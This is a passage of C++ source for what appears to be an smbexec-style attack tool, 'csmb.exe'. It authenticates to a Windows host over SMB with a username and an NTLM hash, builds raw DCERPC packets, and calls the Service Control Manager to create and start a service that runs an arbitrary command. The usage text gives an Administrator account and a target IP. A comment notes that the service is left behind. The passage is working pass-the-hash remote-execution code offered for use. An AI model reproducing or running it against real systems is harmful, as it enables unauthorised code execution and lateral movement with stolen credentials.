	char* PacketSCMCreateServiceW3_buf = new char[sizeof(PacketSCMCreateServiceW3) + Command_len];
	PacketSCMCreateServiceW3 PacketSCMCreateServiceW3 = PacketSCMCreateServiceW3Init();
	PacketSCMCreateServiceW3.BinaryPathName_MaxCount[0] = Command_len / 2;
	PacketSCMCreateServiceW3.BinaryPathName_ActualCount[0] = Command_len / 2;
	memcpy(PacketSCMCreateServiceW3_buf, &PacketSCMCreateServiceW3,sizeof(PacketSCMCreateServiceW3));
	memcpy(PacketSCMCreateServiceW3_buf + sizeof(PacketSCMCreateServiceW3), Command_buf, Command_len);
	DWORD PacketSCMCreateServiceW_buf_len3 = sizeof(PacketSCMCreateServiceW3) + Command_len;

	 
	//初始化第四部分 拼接全部  W4即为最终buf
	PacketSCMCreateServiceW4 PacketSCMCreateServiceW4 = PacketSCMCreateServiceW4Init();

	DWORD PacketSCMCreateServiceW4_buf_len = sizeof(PacketSCMCreateServiceW4) + PacketSCMCreateServiceW1_buf_len + PacketSCMCreateServiceW_buf_len2 + PacketSCMCreateServiceW_buf_len3;
	char* PacketSCMCreateServiceW4_buf = new char[sizeof(PacketSCMCreateServiceW4) + PacketSCMCreateServiceW1_buf_len + PacketSCMCreateServiceW_buf_len2 + PacketSCMCreateServiceW_buf_len3];
	memcpy(PacketSCMCreateServiceW4_buf, PacketSCMCreateServiceW1_buf, PacketSCMCreateServiceW1_buf_len);
	memcpy((char*)((ULONG64)PacketSCMCreateServiceW4_buf + PacketSCMCreateServiceW1_buf_len), PacketSCMCreateServiceW2_buf, PacketSCMCreateServiceW_buf_len2);
	memcpy((char*)((ULONG64)PacketSCMCreateServiceW4_buf + PacketSCMCreateServiceW1_buf_len + PacketSCMCreateServiceW_buf_len2), PacketSCMCreateServiceW3_buf, PacketSCMCreateServiceW_buf_len3);
	memcpy((char*)((ULONG64)PacketSCMCreateServiceW4_buf + PacketSCMCreateServiceW1_buf_len + PacketSCMCreateServiceW_buf_len2 + PacketSCMCreateServiceW_buf_len3), &PacketSCMCreateServiceW4, sizeof(PacketSCMCreateServiceW4));


	//CreateServiceW
	printf("[+]CreateServiceW Attemp\r\n");
	SMB2Header.Command[0] = 0x9;
	SMB2Header.MessageID[0] = ++MessageID;

	write_length = PacketSCMCreateServiceW4_buf_len + 24;
	alloc_hint = PacketSCMCreateServiceW4_buf_len;
	PacketRPCRequest.PacketFlags = 0x03;
	memcpy(PacketRPCRequest.FragLength, &write_length, 2);
	PacketRPCRequest.CallID[0] = 0x01;
	memcpy(PacketRPCRequest.AllocHint, &alloc_hint, 4);
	PacketRPCRequest.Opnum[0] = 0x0c;

	PacketSMB2WriteRequest = PacketSMB2WriteRequestInit();
	memcpy(PacketSMB2WriteRequest.FileID, File_ID, 16);
	DWORD PacketSMB2WriteRequest_len = sizeof(PacketRPCRequest) + PacketSCMCreateServiceW4_buf_len;
	PacketSMB2WriteRequest.Length[0] = *(char*)((ULONG64)&PacketSMB2WriteRequest_len);
	PacketSMB2WriteRequest.Length[1] = *(char*)((ULONG64)&PacketSMB2WriteRequest_len + 1);

	RPC_data_length = sizeof(PacketSMB2WriteRequest) + PacketSCMCreateServiceW4_buf_len + sizeof(PacketRPCRequest);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	DWORD PacketNetBIOSSessionService_len = sizeof(SMB2Header) + RPC_data_length;
	PacketNetBIOSSessionService.Length[1] = *(char*)((ULONG64)&PacketNetBIOSSessionService_len + 1);
	PacketNetBIOSSessionService.Length[2] = *(char*)((ULONG64)&PacketNetBIOSSessionService_len);

	//PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + RPC_data_length;

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2WriteRequest, sizeof(PacketSMB2WriteRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest), &PacketRPCRequest, sizeof(PacketRPCRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest), PacketSCMCreateServiceW4_buf, PacketSCMCreateServiceW4_buf_len);

	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest) + PacketSCMCreateServiceW4_buf_len, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]CreateServiceW Successfully!\r\n");
	}
	else
	{
		printf("[!]CreateServiceW Failed!\r\n");
		exit(-1);
	}


	//ReadRequest
	SMB2Header.Command[0] = 0x8;
	SMB2Header.MessageID[0] = ++MessageID;

	PacketSMB2ReadRequest = PacketSMB2ReadRequestInit();
	memcpy(PacketSMB2ReadRequest.FileID, File_ID, 16);
	memcpy(PacketSMB2ReadRequest.Length, PSRRLength, 4);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest);

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2ReadRequest, sizeof(PacketSMB2ReadRequest));
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest), 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);


	//StartServiceW
	printf("[+]StartService Attemp\r\n");
	char* SMB_service_context_handle = new char[20];
	memcpy(SMB_service_context_handle, ((char*)(ULONG64)g_RecvBuf + 112), 20);

	SMB2Header.Command[0] = 0x9;
	SMB2Header.MessageID[0] = ++MessageID;

	char* PacketSCMStartServiceW_buf = new char[28];
	ZeroMemory(PacketSCMStartServiceW_buf,28);
	memcpy(PacketSCMStartServiceW_buf, SMB_service_context_handle, 20);

	write_length = 28 + 24;
	alloc_hint = 28;
	PacketRPCRequest.PacketFlags = 0x03;
	memcpy(PacketRPCRequest.FragLength, &write_length, 2);
	PacketRPCRequest.CallID[0] = 0x01;
	memcpy(PacketRPCRequest.AllocHint, &alloc_hint, 4);
	PacketRPCRequest.Opnum[0] = 0x13;

	PacketSMB2WriteRequest = PacketSMB2WriteRequestInit();
	memcpy(PacketSMB2WriteRequest.FileID, File_ID, 16);
	PacketSMB2WriteRequest.Length[0] = sizeof(PacketRPCRequest) + 28;

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] =  sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + 28 + sizeof(PacketRPCRequest);

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2WriteRequest, sizeof(PacketSMB2WriteRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest), &PacketRPCRequest, sizeof(PacketRPCRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest), PacketSCMStartServiceW_buf, 28);

	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest) + 28, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]StartService Successfully!\r\n");
	}
	else
	{
		printf("[!]StartService Failed!\r\n");
		exit(-1);
	}


	//ReadRequest
	SMB2Header.Command[0] = 0x8;
	SMB2Header.MessageID[0] = ++MessageID;

	PacketSMB2ReadRequest = PacketSMB2ReadRequestInit();
	memcpy(PacketSMB2ReadRequest.FileID, File_ID, 16);
	memcpy(PacketSMB2ReadRequest.Length, PSRRLength, 4);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest);

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2ReadRequest, sizeof(PacketSMB2ReadRequest));
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest), 0);
	//dRet = recv(socks, g_RecvBuf, 4096, 0);

	//--------------------------------------RPC-----------------------------------------------
	//并未清除创建的服务,懒得写了..

	//清理内存
	free(g_RecvBuf);
	free(sendbuf);
	printf("[+]Connection Disconnected");
	closesocket(socks);
 	WSACleanup();
	return 1;
}

int wmain(int argc, wchar_t* argv[]) 
{
	printf("Usage:csmb.exe username domain IP Hash ServiceName Command(ServiceName)\r\n");
	printf("Example:csmb.exe Administrator WorkStation 192.168.1.1 00000000000000000000000000000000 MyService C:\\Windows\\System32\\notepad.exe\r\n");
	g_RecvBuf = (char*)VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	wchar_t* my_username = argv[1];
	wchar_t* my_domain = argv[2];
	wchar_t* my_Target_IP = argv[3];
	NTLMHash = (const char*)argv[4];
	ServiceName = argv[5];
	Command = argv[6];
	if (my_username == NULL || my_domain == NULL || my_Target_IP == NULL || NTLMHash == NULL || ServiceName == NULL)
	{
		printf("[!]Args Error\r\n");
		printf("Usage:csmb.exe username domain IP Hash ServiceName Command\r\n");
		return 0;
	}

	char* NTLM_buf = new char[32];
	wcstombs(NTLM_buf, (const wchar_t*)NTLMHash, 32);

	NTLMHash = NTLM_buf;
	username = my_username;
	domain = my_domain;

	Target_IP = my_Target_IP;
	char* IP = new char[50];
	sprintf(IP, "%ws", my_Target_IP);
	A_Target_IP = IP;

	wcscat(Command,L" ");

	
	SmbExec();
	return 0;
}